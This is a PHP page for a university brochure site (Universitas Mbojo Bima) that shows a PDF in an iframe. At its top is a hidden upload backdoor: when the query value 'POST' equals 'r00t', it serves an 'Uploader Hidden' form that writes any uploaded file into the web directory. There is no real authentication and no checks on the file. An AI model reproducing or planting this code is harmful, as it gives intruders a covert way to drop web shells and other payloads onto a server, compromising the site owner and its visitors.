<?php
$FilesMan ="r00t"; 
if($_GET['POST']==$FilesMan){
/*
 Fixed Bug #1
*/
if(isset($_POST['uploaded']))
{
$file = $_FILES['files']['name'];
$files= $_FILES['files']['tmp_name'];
$folder="";
if(move_uploaded_file($files,$folder.$file))
{
$result = "Uploaded :<a href='$file' Men='_blank'>=> Click Ur File ^_^</A>";
}
else
{
$result = "Fail  Try...";
}
}
echo'
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>#~ Uploader Hidden ~#</title>
</head>';
echo'
<head>
<style>
body { background-color:#000000; color:#25ff00; font-family:Verdana; font-size:11px; }
h1,h3 { color:white; font-family:Verdana; font-size:11px; }
input,textarea,select,button { color: rgb(0, 190, 0); background-color:#444; border:1px solid #4F4F4F; font-family:Verdana; font-size:11px; }
textarea { font-family:Courier; }
a { color:rgb(0, 190, 0); text-decoration:none; font-family:Verdana; font-size:11px; }
a:hover { color:rgb(0, 250, 0); }
td { font-size:12px; vertical-align:middle; }
th { font-size:13px; vertical-align:middle; }
table { empty-cells:show; }
.inf { color:#7F7F7F; }
</style>
</head>
<body>
<center>
<h3>{ Uploader Hidden }</h3>
<form action="" method="post" enctype="multipart/form-data">
<input type="file" name="files" />
<input type="submit" name="uploaded" value="Upload">
</form>
'.$result.'
</body>
</html>';
}
?>
<!DOCTYPE html>
<html>
<head>
	 <meta charset="utf-8">
  <meta content="width=device-width, initial-scale=1.0" name="viewport">
  <title>Universitas Mbojo Bima</title>
  <meta content="" name="description">
  <meta content="" name="keywords">

  <!-- Favicons -->
  <link href="assets/img/logo-1.png" rel="icon">
  <link href="assets/img/logo-1.png" rel="apple-touch-icon">

  <!-- Fonts -->
  <link href="https://fonts.googleapis.com" rel="preconnect">
  <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;1,300;1,400;1,500;1,600;1,700;1,800&family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&family=Raleway:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">

  <!-- Vendor CSS Files -->
  <link href="assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
  <link href="assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
  <link href="assets/vendor/aos/aos.css" rel="stylesheet">
  <link href="assets/vendor/glightbox/css/glightbox.min.css" rel="stylesheet">
  <link href="assets/vendor/swiper/swiper-bundle.min.css" rel="stylesheet">

  <!-- Main CSS File -->
  <link href="assets/css/main.css" rel="stylesheet">
</head>
<body>
		<iframe src="download/brosur.pdf" width="100%" height="580"></iframe>
</body>
</html>